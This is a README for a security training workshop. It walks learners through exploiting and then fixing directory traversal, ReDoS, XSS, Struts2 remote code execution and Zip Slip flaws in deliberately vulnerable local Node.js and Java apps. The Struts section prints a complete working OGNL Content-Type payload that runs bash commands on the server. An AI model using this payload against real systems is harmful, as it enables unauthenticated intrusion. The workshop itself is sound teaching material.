# exploit-workshop
In this step by step workshop you'll learn how to exploit various real world vulnerabilities existing in vulnerable versions of packages in a Node.js and Java application.

# Required software you need to install for this workshop:

* A proper terminal (linux based) - pick your favourite
* [cUrl](https://curl.haxx.se/download.html) - download and install a binary for your OS
* [Httpie](https://httpie.org/) - (brew install httpie)
* [Npm](https://nodejs.org/en/) - (brew install node)
* [Maven](https://maven.apache.org/install.html)
* [Java 8](https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)
* [Git](https://git-scm.com/downloads)
* [Mongod](https://docs.mongodb.com/manual/installation/) - (brew install mongodb)

# An introduction to this workshop

This workshop will lead you through installing and exploiting a number of intentionally vulnerable applications. The applications will use real world packages with know vulnerabilities, including:

* Directory traversal
* Regular expression denial of service (ReDoS)
* Cross site scripting (XSS)
* Remote code execution (RCE)
* Arbitrary file overwrite (Zip Slip)

These exploits exist in a number of applications, most of which you will need to install either locally or on a cloud instance. The instructions below will walk you through the local installations, but you are more than welcome to try them out on remote cloud instances also.

For each vulnerability section in this workshop, you’ll be given information about the vulnerability as well as the package it exists in. You are encouraged to attempt to hack the application by trial and error without reading any hints at first. Try to think how you can trick the application sanitization and get into the mind of a hacker. The hints are there for when you get stuck so read them in order as and when you need a helping hand. If you can complete the hack without hints, that’s great! However it can be good to read the hints afterwards to make sure you broke in the same way we did! Plus there could be little tips in there to learn from also.

# Goof installation

In a terminal, start mongod, using the following command:

```
$ mongod &
```

Next you’ll need to fork the goof repository, clone it and build your application. The application can be found on GitHub here: [https://github.com/snyk/goof](https://github.com/snyk/goof).

Fork this application to your local repository so that any remediation you choose to perform will only happen on your repository and won’t affect others in this workshop.

Clone the repository onto your local file system and navigate into the project’s root directory. Run the following commands to download the dependencies for the goof application:

```
$ npm install
```

Your application should be ready to run. You can start the application by running the following command from within the main project directory:

```
$ npm start
```

From your browser of choice, navigate to [http://localhost:3001](http://localhost:3001) and you should see the following page.

![Goof homepage](images/image12.png)

Take a few minutes playing with the site, and in particular, create a few todo items, using regular text “Buy Milk” as well as using markdown “Buy *lots* of milk”. Also navigate to the very modest about page linked to from the bottom of the homepage. Delight in the CSS-foo used to create this about page. Note: PRs sent that make this page look nicer will not be merged ;o)

![Goof about page](images/image1.png)

## Directory Traversal
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with "dot-dot-slash" (```../```) sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

* *Directory Traversal* vulnerabilities can be generally divided into two types:

* *Information Disclosure* allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.
Writing arbitrary files: Allows the attacker to create or replace existing files. This type of vulnerability is also known as Zip-Slip.

The package in the goof application which contains a directory traversal vulnerability which we will exploit is the st package. Take a look at the st docs and familiarise yourself with the library.

You should now be aware of what directory traversal is, what the st package does and can go ahead and hack the application! Look around the application for where the st package might be used and try to traverse to a directory you should be allowed to access.

Here are some hints to give you clues if you get stuck - try your best to only look at them once you’ve had a try yourself already and need help.

Click to see [Hint 1](st/hint1.md).

Click to see [Hint 2](st/hint2.md).

Click to see [Hint 3](st/hint3.md).

Click to see [Hint 4](st/hint4.md).

Click to see [Hint 5](st/hint5.md).

Click to see [Hint 6](st/hint6.md).

Click to see [Hint 7](st/hint7.md).

Click to see [Hint 8](st/hint8.md).

Click to see [Hint 9](st/hint9.md).

Navigate your filesystem as if you were an attacker to find 3 pieces of sensitive information on your machine that you perhaps wouldn’t want an attacker to see.

Click to see [Hint 10](st/hint10.md).

Take a look at the vulnerability description, including the CVSS score: [https://snyk.io/vuln/npm:st:20140206](https://snyk.io/vuln/npm:st:20140206). Why do you think the vulnerability is a medium severity, rather than high?

The remediation section ([https://snyk.io/vuln/npm:st:20140206#remediation](https://snyk.io/vuln/npm:st:20140206#remediation)), as explained in the link above is to update the version of the st package to 0.2.5. Stop your application by hitting ```Ctrl+C``` in the window you ran ```npm start```. Open the ```package.json``` file and make the dependency version change. Download your new dependency by running ```npm install``` and then start your application again, using ```npm start```.

Try your hacks again. *Congratulations!*, you’ve remediated the vulnerability and should now be redirected to the homepage each time you try to break free of the public folder.

## Regular expression denial of service (ReDoS)

Take a look at the description of a ReDoS vulnerability here: [https://snyk.io/vuln/npm:ms:20151024](https://snyk.io/vuln/npm:ms:20151024). This vulnerability in the ms package will be the one we will break in the goof application. Use the following command to add a todo item that contains a string representation of time:

```
$ echo 'content=Call mom in 20 minutes' | http --form http://localhost:3001/create -v
```

The ms library has matched a time pattern in your content input string. This is represented slightly differently on the goof webpage.

![Call mom image](images/image8.png)

Using your knowledge of how ReDoS works, try to pass a content string that causes a noticeable delay, or a denial of service for other users. Note that while the request is being processed, the webpage will buffer any of your further requests until your first request is handled.

Click to see [Hint 1](ms/hint1.md).

Click to see [Hint 2](ms/hint2.md).

Click to see [Hint 3](ms/hint3.md).

Click to see [Hint 4](ms/hint4.md).

Click to see [Hint 5](ms/hint5.md).

How would you programmatically avoid this attack in your application code?

The vulnerability page’s remediation section ([https://snyk.io/vuln/npm:ms:20151024#remediation](https://snyk.io/vuln/npm:ms:20151024#remediation)) states that the remediation is to upgrade your ms library to version 0.7.1. Stop down your app (```Ctrl+C```), make the dependency change to your ```package.json``` file, download your new dependency version (```npm install```) and start your application again (```npm start```).

Try your hacks again. *Congratulations!*, you’ve remediated the vulnerability!

## Cross Site Scripting (XSS)

XSS attacks occur when an attacker tricks a user’s browser to execute malicious JavaScript code in the context of a victim’s domain. Such scripts can steal the user’s session cookies for the domain, scrape or modify its content, and perform or modify actions on the user’s behalf, actions typically blocked by the browser’s Same Origin Policy.
These attacks are possible by escaping the context of the web application and injecting malicious scripts in an otherwise trusted website. These scripts can introduce additional attributes (say, a "new" option in a dropdown list or a new link to a malicious site) and can potentially execute code on the client's side, unbeknown to the victim. This occurs when characters like ```< > " '``` are not escaped properly.

There are a few types of XSS:

* *Persistent XSS* is an attack in which the malicious code persists into the web app’s database.
* *Reflected XSS* is an attack which the website echoes back a portion of the request. The attacker needs to trick the user into clicking a malicious link (for instance through a phishing email or malicious JS on another page), which triggers the XSS attack.
* *DOM-based XSS* is an attack that occurs purely in the browser when client-side JavaScript echoes back a portion of the URL onto the page. DOM-Based XSS is notoriously hard to detect, as the server never gets a chance to see the attack taking place.

The vulnerability exists in the marked library. This library allows us to enter markdown text into the todo input box and have the resultant text display in bold, or whatever your heart desires. Now that you’re more than familiar with this complex, multipage application, keeping in mind the package that is vulnerable.

To start off with, lets try to display the alert ‘1’. Very cliché, right?

Click to see [Hint 1](marked/hint1.md).

Click to see [Hint 2](marked/hint2.md).

Click to see [Hint 3](marked/hint3.md).

Click to see [Hint 4](marked/hint4.md).

Click to see [Hint 5](marked/hint5.md).

Click to see [Hint 6](marked/hint6.md).

Click to see [Hint 7](marked/hint7.md).

Click to see [Hint 8](marked/hint8.md).

Once you have been able to execute some JavaScript that creates an alert, as shown below, let’s try something a little trickier to get some sensitive information.

![marked exploit](images/image10.png)

The remediation section ([https://snyk.io/vuln/npm:marked:20150520#remediation](https://snyk.io/vuln/npm:marked:20150520#remediation)), as explained in the link above is to update the version of the marked package to 0.3.9. Stop your application by hitting ```Ctrl+C``` in the window you ran ```npm start```. Open the ```package.json``` file and make the dependency version change. Download your new dependency by running ```npm install``` and then start your application again, using ```npm start```.

Try your hacks again. Congratulations, you’ve remediated the XSS vulnerability and shouldn’t be able to embed JavaScript on the web page any longer.

# Java Goof Installation

To start with, you’ll need to clone the java-goof repository, and build your application. The application can be found on GitHub here: [https://github.com/snyk/java-goof](https://github.com/snyk/java-goof).

Clone the repository onto your local file system

```
$ git clone https://github.com/benas/todolist-mvc.git
```

Open a terminal and run the following command from the root directory:

```
$ mvn install
```

Navigate into the ```todolist-web-struts``` directory and run the following to start the server:

```
$ mvn tomcat7:run
```

From a browser navicate to the following URL: [http://localhost:8080/](http://localhost:8080/)

You will see this application. It looks better than the Node application. Because Java is better than Node.

![Java Goof homepage](images/image9.png)

Click “Sign In” and use the following credentials:

```
Username: foo@bar.org
Password: foobar
```

When signed in, you’ll see a number of todo entries. If you click about at the top of the screen, you’ll see that the application uses, Spring, Hibernate and Apache Struts. This is very kind of the application to give us this data! Websites aren’t usually this kind :)

## Remote Code Execution

The vulnerability exists in the ```org.apache.struts:struts2-core``` package.

Affected versions of the package are vulnerable to Arbitrary Command Execution while uploading files with the Jakarta Multipart parser. This particular vulnerability can be exploited by an attacker by sending a crafted request to upload a file to the vulnerable server that uses a Jakarta-based plugin to process the upload request.

The attacker can then send malicious code in the ```Content-Type```, ```Content-Disposition``` or ```Content-Length``` HTTP headers, which will then be executed by the vulnerable server. A proof of concept that demonstrates the attack scenario is publicly available and the vulnerability is being actively exploited in the wild.

Although maintainers of the open source project immediately patched the vulnerability, Struts servers that have yet to install the update remain under attack by hackers who exploit it to inject commands of their choice.

This attack can be achieved without authentication. To make matters worse, web applications don't necessarily need to successfully upload a malicious file to exploit this vulnerability, as just the presence of the vulnerable Struts library within an application is enough to exploit the vulnerability.

Here is an example header which can exploit the vulnerability. Notice the content type starts with ```%{```.

```
"Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='COMMAND').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

You’ll notice a ```ProcessBuilder``` is created and a bash command will be executed as a result.

Hack the application by making an HTTP GET request to the application, sending this header in the request.

Click to see [Hint 1](struts/hint1.md).

Click to see [Hint 2](struts/hint2.md).

You should by now have executed a remote command, like this env command to retrieve the environment variables of your machine:

![Struts vuln exploits](images/image6.png)

At this state you now have execution rights on the machine through curling an URL. Continue to run other commands to see what you can learn about the machine as well as run on the machine.

# Zip Slip

Create a new Maven project in your IDE of choice. I won’t judge you. Add a new dependency in your ```pom.xml``` file.

```xml
    <dependency>
      <groupId>org.zeroturnaround</groupId>
      <artifactId>zt-zip</artifactId>
      <version>1.12</version>
      <type>jar</type>
    </dependency>
```

In this repository, you'll find a [zip-slip.zip](zipslip/zip-slip.zip) archive. Download it and run the following command on the archive to see the output. I expect you’ll know how this hack works once you see the output.

```
$ jar -tvf zip-slip.zip
```

## The Zip Slip Vulnerability

Zip Slip is a form of directory traversal that can be exploited by extracting files from an archive. The premise of the directory traversal vulnerability is that an attacker can gain access to parts of the file system outside of the target folder in which they should reside. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine. The vulnerability can also cause damage by overwriting configuration files or other sensitive resources, and can be exploited on both client (user) machines and servers.

The two parts required to exploit this vulnerability is a malicious archive and extraction code that does not perform validation checking. Let’s look through each of these in turn. First of all, the contents of the zip file needs to have one or more files that break out of the target directory when extracted. In the ```zip-slip.zip``` example, we can see two files, a good.txt file which would be extracted into the target directory and an evil.txt file which is trying to traverse up the directory tree to the tmp directory. You’ll notice many levels of ```../``` exist so that the file stands a better chance of reaching the root directory, before trying to traverse to the ```/tmp``` directory from the root directory.

Use the ```zt-zip```’s unpack utility found in ```ZipUtil``` to extract the file and notice where the ```good.txt``` and ```evil.txt``` appear on your filesystem.

Click to see [Hint 1](zipslip/hint1.md).

Click to see [Hint 2](zipslip/hint2.md).

Once you have unzipped the evil.txt file into your tmp directory, take a look at the vulnerability information ([https://snyk.io/vuln/SNYK-JAVA-ORGZEROTURNAROUND-31681](https://snyk.io/vuln/SNYK-JAVA-ORGZEROTURNAROUND-31681)).

Fix the vulnerability!

Click to see [Hint 3](zipslip/hint3.md).

Click to see [Hint 4](zipslip/hint4.md).

Now that you’re remediated the vulnerability in your ```zt-zip``` dependency, let’s look at the code that can be used to do this in Java. Note we used the Apache Commons IO library in this example to perform our file copy on line 8.

```java
1.    	final String destinationDir = /* <your destination dir> */;
2.    	ZipFile zip = new ZipFile(/* <your zip file> */);
3.    	Enumeration<ZipEntry> entries =  (Enumeration<ZipEntry>) zip.entries();
4.    	while (entries.hasMoreElements()) {
5.    	  ZipEntry e = entries.nextElement();
6.    	  File f = new File(destinationDir, e.getName());
7.    	  InputStream input = zip.getInputStream(e);
8.    	  FileUtils.copyToFile(input, f);
9.  	}
```

Let’s switch out our previous ```ZipUtil.unpack``` invocation with this code. Delete the ```good.txt``` and ```evil.txt``` files from your file system and run the application again. You’ll notice the ```evil.txt``` file once again reaches the ```/tmp``` directory.

Identify which lines of code above are the culprits and fix them!

Click to see [Hint 5](zipslip/hint5.md).

Click to see [Hint 6](zipslip/hint6.md).

Click to see [Hint 7](zipslip/hint7.md).

Click to see [Hint 8](zipslip/hint8.md).

Click to see [Hint 9](zipslip/hint9.md).

Once you’ve defensively coded your solution, check out our final code sample in [Hint 9](zipslip/hint9.md) to see how it compares to your version. Did you include the trailing file separator on line 9? This ensures that the directory doesn’t just start with the directory name we’ve chosen, but is the directory we chose to extract files to.

Thank you for taking this workshop. If you see any typos or suggest additional hints, please send us a PR!
